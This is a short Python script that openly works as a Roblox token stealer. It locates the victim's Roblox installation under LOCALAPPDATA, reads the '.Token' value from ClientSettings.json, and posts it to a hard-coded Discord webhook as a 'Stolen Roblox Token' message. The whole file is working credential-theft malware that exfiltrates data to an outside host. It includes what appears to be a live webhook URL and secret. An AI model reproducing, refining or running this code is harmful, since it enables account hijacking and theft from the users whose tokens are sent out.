import os
import requests
import json
import base64
import sqlite3

def get_roblox_token():
    try:
        local_app_data = os.getenv('LOCALAPPDATA')
        roblox_path = os.path.join(local_app_data, 'Roblox', 'Versions', 'version-0.546.0.5212872', 'RobloxPlayerBeta.exe')
        if not os.path.exists(roblox_path):
            return None

        db_path = os.path.join(local_app_data, 'Roblox', 'ClientSettings.json')
        if not os.path.exists(db_path):
            return None

        with open(db_path, 'r') as f:
            data = json.load(f)

        token = data.get('.Token')
        return token
    except Exception as e:
        print(f"Error getting Roblox token: {e}")
        return None

def send_to_webhook(token):
    webhook_url = 'https://discordapp.com/api/webhooks/1301119068866089041/05X09KrBTwDTJpr1I7_mc8Q_uFIw9OmQRQRqPlQLIXl_XFwF3P41HuBqa5vuLUYdCh3r'
    payload = {
        "content": f"Stolen Roblox Token: {token}"
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
    if response.status_code == 204:
        print("Token sent successfully!")
    else:
        print(f"Failed to send token: {response.status_code} {response.text}")

if __name__ == "__main__":
    token = get_roblox_token()
    if token:
        send_to_webhook(token)
    else:
        print("No token found.")